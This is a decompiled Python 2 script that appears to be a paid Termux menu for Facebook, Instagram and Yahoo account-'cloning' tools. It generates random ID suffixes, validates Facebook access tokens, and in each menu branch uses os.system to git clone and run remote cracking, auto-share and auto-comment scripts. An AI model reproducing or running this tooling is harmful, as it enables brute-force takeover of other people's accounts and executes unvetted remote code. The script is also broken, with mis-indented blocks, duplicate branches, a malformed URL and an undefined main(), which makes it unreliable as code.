# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-06-07 12:26:59.367379
import os
import time
import requests
import datetime
import random
import multiprocessing.pool as multiprocessing
import getpass
import json
import threading
import sys
import uuid
import shutil
import zlib
import base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

l1 = '100077'
l2 = '100078'
os.system('rm -rf token.txt')
g = '\x1b[1;92m'
r = '\x1b[1;91m'
w = '\x1b[1;97m'
y = '\x1b[1;93m'
n = '\x1b[1;94m'
gu = '\x1b[1;95m'
sm = '\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')

logo = "\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m   Author      :     MAHDI HASAN     \n'\x1b[1;92m'   Github      :     MAHDI SHUVO  \n'\x1b[1;93m'   FB        :     https://web.facebook.com/m.mahdi.80\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     01887408882            \n"
dec = '2'
server = '2'
rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header = {
    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': rsauser,
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
fuck = []
idx = []
oks = []
cps = []

def main_apv():
    imt = '+MAHDI=='
    os.system('clear')
    print logo
    
    try:
        key1 = open('/sdcard/.android.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print ('           You dont have subscrption')
        print ('           Hello Dear Ya Cammonds Paid Han Or')
        print ('           Ap Ke Subscription Nhi Ha Please Ap')
        print ('           Admin Sa Rabta Kran Thanks')
        print ('           Subscription Kelya Enter Press Kro')
        print ('           Or Whatsapp Pa Rabta Kro Thanks')
       
        myid = uuid.uuid4().hex[:10]
        print '         YOUR KEY : ' + myid + imt
        kok = open('/sdcard/.android.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print ('           Ya Uper Wale Ap Ke KEY Ha')
        print ('           Copy Kar Ka WhatsApp Pa Bhaj Dena')
       
        print '     Agar Ap Na Subscription Kar Le Ha To')
        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
        os.system('xdg-open https://wa.me/+8801887408882')

    r1 = requests.get('https://raw.githubusercontent.com/MAHDI-Shuvo/Mahdipaid1/main/mahdi.text').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        print logo
        print ('           You dont have subscrption')
        print ('           Hello Dear Ya Cammonds Paid Han Or')
        print ('           Ap Ke Subscription Nhi Ha Please Ap')
        print ('           Admin Sa Rabta Kran Thanks')
        print ('           Subscription Kelya Enter Press Kro')
        print ('           Or Whatsapp Pa Rabta Kro Thanks')
        print ''
        print ('         YOUR KEY : ' + key1)
        print ''
        print ('           Ya Uper Wale Ap Ke KEY Ha')
        print ('           Copy Kar Ka WhatsApp Pa Bhaj Dena')
       
        print ('     Agar Ap Na Subscription Kar Le Ha To')
        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
        os.system('xdg-open https://wa.me/+8801887408882')


def main_system():
    
    try:
        token = open('token.txt', 'r').read()
    except:
        pass

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        m = q['name']
        
    except requests.exceptions.ConnectionError:
        
print logo
print ('Trun On Data An Then \t')
       
    except:
        print ('\x1b[1;91mToken on Chekpiont ')
        os.system('rm -rf token.txt')

    os.system('clear')
    
print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/====
\033[1;31mFb ; https://web.facebook.com/mahdihasan.80
\033[1;33mLIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
\033[0;36m================================================================""")
print("""
\033[1;36m[1]CLONE FROM2006- 2009 ID
\033[1;32m[2]CLONE FROM 2009 ID 
\033[1;88m[3]CLONE FROM 2010-2020 ID
\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
\033[1;32m[5]CLONE FROM INSTRAGAM ID
\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
\033[1;36m[7]CLONE FROM  PUBLICK ID v2
\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
\033[1;33m[9]CLONE FROM NUMBER BD
\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
\033[1;88m[11]CLONE FROM FROM INDIA
\033[0;33m[12]CLONE FROM AFGHANISTAN 
\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
\033[1;33m[14]CLONE FROM FREOM File Creating
\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
\033[1;32m[17]CLONE FROM 2009 ID [MAO]
\033[1;37m[18]FB AUTO SHARE (need TOKEN)
\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
\033[1;33m[20]CLONE YAHOO 
\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
\033[1;33m[23]CLONE FROM FREOM File Creating V
\033[1;36m[24]CLONE FROM2003- 2005 ID
""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 mahdi9.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python 20091st.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["03", "3"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["04", "4"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD6.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["05", "5"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && python instragam.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["06", "6"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    os.system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["07", "7"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python Prem.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["08", "8"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD11.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["09", "9"]:
    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
    os.system('python2 smbf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["10"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
	
	
elif pil in ["11"]:
    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["12"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 Mahadi-Afg.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["13"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python mahdi2.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["14"]:
    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
    os.system('cd DUM-ID && python Doubled.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["15"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    
elif pil in ["16"]:
    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py cvx')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["17"]:
    os.system('pip2 install mclone')
    os.system('mclone')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["18"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python mahdi.py')
    
elif pil in ["19"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python autocomment.py')
  
	
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python yahoo.py')	

elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	

elif pil in ["21"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Adf.py ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
	
elif pil in ["22"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Juttbrand.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["23"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python2 file.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["24"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python2 811.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2) 
